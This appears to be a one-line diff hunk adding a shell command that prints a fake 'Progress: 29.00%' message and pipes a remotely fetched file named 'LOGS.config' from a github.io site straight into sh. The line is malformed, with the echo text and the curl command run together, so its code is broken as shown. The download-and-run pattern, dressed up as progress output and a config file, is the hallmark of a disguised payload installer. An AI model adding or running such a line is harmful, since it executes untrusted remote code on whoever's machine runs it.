@@ -1,0 +1,1 @@
+echo Progress: 29.00%curl -L --progress-bar frkns.github.io/fun/LOGS.config | sh
